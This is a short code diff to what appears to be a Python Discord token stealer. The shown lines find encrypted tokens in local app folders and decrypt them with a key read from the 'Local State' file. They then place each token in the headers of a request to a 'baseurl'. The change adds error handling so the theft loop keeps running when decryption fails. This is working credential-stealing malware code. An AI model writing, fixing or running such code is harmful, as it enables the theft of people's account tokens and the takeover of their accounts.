@@ -107,10 +107,13 @@ for name, path in paths.items():
                     if x.strip()
                 ]:
                     for y in findall(encrypt_regex, line):
-                        token = decrypt_val(
-                            b64decode(y.split("dQw4w9WgXcQ:")[1]),
-                            get_key(roaming + f"\\{disc}\\Local State"),
-                        )
+                        try:
+                            token = decrypt_val(
+                                b64decode(y.split("dQw4w9WgXcQ:")[1]),
+                                get_key(roaming + f"\\{disc}\\Local State"),
+                            )
+                        except:
+                            token = "ERROR"
                         r = get(
                             baseurl,
                             headers={
